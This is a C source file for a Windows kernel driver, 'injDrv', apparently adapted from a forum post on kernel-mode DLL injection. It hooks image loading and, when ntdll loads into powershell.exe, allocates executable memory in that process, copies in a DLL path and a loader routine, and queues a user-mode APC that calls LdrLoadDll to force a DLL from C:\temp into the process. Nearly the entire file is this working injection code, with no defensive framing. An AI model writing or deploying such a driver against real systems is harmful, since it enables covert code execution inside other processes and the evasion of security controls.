#include "pe.h"
#include "pch.h"
#include "helpers.h"
#include "apc_functions.h"

// The code based on the following: http://www.rohitab.com/discuss/topic/40737-inject-dll-from-kernel-mode/

#pragma warning(disable : 4152 4996)


void load_image(IN PUNICODE_STRING pFullImageName, IN HANDLE hProcessId, IN PIMAGE_INFO pImageInfo)
{

	UNICODE_STRING ModuleName;

	RtlInitUnicodeString(&ModuleName, L"\\Device\\HarddiskVolume2\\Windows\\System32\\ntdll.dll");


	UNICODE_STRING target_process;

	RtlInitUnicodeString(&target_process, L"\\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");

	// if target process found
	if (proc_check(hProcessId, &target_process) == -1)
	{
		return;
	}

	// TODO: 1. Check if its a system process. 
	//		 2. Check if its a driver module.


	// if ntdll is loaded 
	if (RtlEqualUnicodeString(pFullImageName, &ModuleName, FALSE) == TRUE)
	{

		PKINJECT InjectionInfo = (PKINJECT)ExAllocatePool(NonPagedPool, sizeof(KINJECT));

		DbgPrint("[+] ntdll base address: %#x \n", pImageInfo->ImageBase);

		DbgPrint("[+] InjectionInfo address : 0x%llx\n", InjectionInfo);


		wchar_t DllPathBuffer[] = L"C:\\temp\\inj_dll.dll";

		RtlInitUnicodeString(&InjectionInfo->DllName, DllPathBuffer);

		DbgPrint("[+] Target DLL Path: %wZ\n", InjectionInfo->DllName);


		PLDR_LOAD_DLL LdrLoadDll = (PLDR_LOAD_DLL)KernelGetProcAddress(pImageInfo->ImageBase, "LdrLoadDll");

		InjectionInfo->LdrLoadDll = LdrLoadDll;


		DbgPrint("[+] LdrLoadDllRoutine is at 0x%p\n", InjectionInfo->LdrLoadDll);


		PEPROCESS process = 0;

		PsLookupProcessByProcessId(hProcessId, &process);

		DbgPrint("[+] EPROCESS address : 0x%p\n", process);

		KeAttachProcess(process);

		DbgPrint("[+] Process attached! \n");

		NTSTATUS status;

		PVOID DllPathBufferAddress = NULL;

		SIZE_T DllPathBufferAddressSize = 4096;

		status = ZwAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&DllPathBufferAddress, 0, &DllPathBufferAddressSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		if (!NT_SUCCESS(status))
		{
			DbgPrint("[-] Failed to allocate memory for dll path buffer, error code: 0x%X [-]\n", status);

			KeDetachProcess();

			DbgPrint("[-] Detached from process\n\n");

			return;
		}

		DbgPrint("[+] Allocated 4096 bytes for DLL Path Buffer\n");


		wcscpy(DllPathBufferAddress, DllPathBuffer);

		DbgPrint("[+] Address of the DLL Path Buffer is : 0x%llx\n", DllPathBufferAddress);

		DbgPrint("[+] Local DLL Path Buffer copied into usermode space: %ws\n", DllPathBufferAddress);


		PVOID  ContextAddress = NULL;

		SIZE_T ContextAllocationSize = 4096;

		status = ZwAllocateVirtualMemory(NtCurrentProcess(), &ContextAddress, 0, &ContextAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		if (!NT_SUCCESS(status))
		{
			
			DbgPrint("[-] Failed to allocate memory for apc context, error code: 0x%X [-]\n", status);
			
			KeDetachProcess();
			
			DbgPrint("[-] Detached from process\n\n");

			return;
		}

		DbgPrint("[+] APC Context allocated in the target process at 0x%p\n", ContextAddress);

		memcpy(ContextAddress, InjectionInfo, sizeof(KINJECT));

		((PKINJECT)ContextAddress)->DllName.Buffer = DllPathBufferAddress;


		DbgPrint("[+] Context copied into the target process\n");


		DbgPrint("[+] DllName test %wZ\n", ((PKINJECT)ContextAddress)->DllName);

		DbgPrint("[+] LdrLoadDll test %p\n", ((PKINJECT)ContextAddress)->LdrLoadDll);

		DbgPrint("[+] Executed test %d\n", ((PKINJECT)ContextAddress)->Executed);

		DbgPrint("[+] DllBase test %p\n", ((PKINJECT)ContextAddress)->DllBase);



		PVOID  NormalRoutineAddress = NULL;

		SIZE_T NormalRoutineAllocationSize = (SIZE_T)((ULONG_PTR)kernel_routine_stub - (ULONG_PTR)InjectorAPCNormalRoutine);

		DbgPrint("[+] Normal Routine function size: %i bytes\n", NormalRoutineAllocationSize);


		status = ZwAllocateVirtualMemory(NtCurrentProcess(), &NormalRoutineAddress, 0, &NormalRoutineAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		if (!NT_SUCCESS(status))
		{

			DbgPrint("[-] Failed to allocate memory for apc normal routine [-]\n");

			KeDetachProcess();

			DbgPrint("[-] Detached from process\n\n");

			return;
		}

		DbgPrint("[+] APC Normal Routine allocated in the target process at 0x%p\n", NormalRoutineAddress);


		memcpy(NormalRoutineAddress, InjectorAPCNormalRoutine, NormalRoutineAllocationSize);

		DbgPrint("[+] Normal Routine copied into the target process\n");


		PKAPC apc = (PKAPC)ExAllocatePool(NonPagedPool, sizeof(KAPC));

		if (!apc)
		{

			DbgPrint("[-] Error: Unable to allocate the APC object.");

			KeDetachProcess();

			DbgPrint("[-] Detached from process\n");

			return;
		}


		KeInitializeApc(apc, PsGetCurrentThread(), OriginalApcEnvironment, kernel_routine_stub, NULL, (PKNORMAL_ROUTINE)NormalRoutineAddress, UserMode, ContextAddress);

		DbgPrint("[+] APC initialized\n");


		KeInsertQueueApc(apc, NULL, NULL, IO_NO_INCREMENT);

		DbgPrint("[+] APC inserted into the queue\n");

		KeDetachProcess();

		DbgPrint("[+] Process Dettached! \n");

		ObDereferenceObject(process);

	}

}



void unload(PDRIVER_OBJECT driver_object)
{

	PsRemoveLoadImageNotifyRoutine(load_image);

	UNICODE_STRING sym_link = RTL_CONSTANT_STRING(L"\\??\\injDrv");

	IoDeleteSymbolicLink(&sym_link);

	IoDeleteDevice(driver_object->DeviceObject);

	DbgPrint("\n[+] injDrv unloaded!\n");

}



NTSTATUS create_close(PDEVICE_OBJECT device_object, PIRP irp)
{

	UNREFERENCED_PARAMETER(device_object);

	irp->IoStatus.Status = STATUS_SUCCESS;

	irp->IoStatus.Information = 0;

	IoCompleteRequest(irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;

}



NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{

	NTSTATUS status = FALSE;

	DbgPrint("[+] injDrv loaded!\n\n");

	UNREFERENCED_PARAMETER(pRegistryPath);

	// Unload function

	pDriverObject->DriverUnload = unload;

	// Major functions

	pDriverObject->MajorFunction[IRP_MJ_CREATE] = pDriverObject->MajorFunction[IRP_MJ_CLOSE] = create_close;


	UNICODE_STRING dev_name = RTL_CONSTANT_STRING(L"\\Device\\injDrv");

	UNICODE_STRING sym_link = RTL_CONSTANT_STRING(L"\\??\\injDrv");

	PDEVICE_OBJECT device_object = NULL;

	BOOLEAN  sym_link_created = FALSE;


	do
	{

		status = IoCreateDevice(pDriverObject, 0, &dev_name, FILE_DEVICE_UNKNOWN, 0, FALSE, &device_object);

		if (!NT_SUCCESS(status))
		{

			KdPrint(("[-] Failed creating device\n"));

			break;

		}

		status = IoCreateSymbolicLink(&sym_link, &dev_name);

		if (!NT_SUCCESS(status))
		{

			KdPrint(("[-] Failed creating symbolic link \n"));

			break;

		}

		sym_link_created = TRUE;


	} while (FALSE);


	PsSetLoadImageNotifyRoutine(load_image);


	if (!NT_SUCCESS(status))
	{

		if (sym_link_created)
		{
			IoDeleteSymbolicLink(&sym_link);
		}
		if (device_object)
		{
			IoDeleteDevice(device_object);
		}

	}

	return status;
}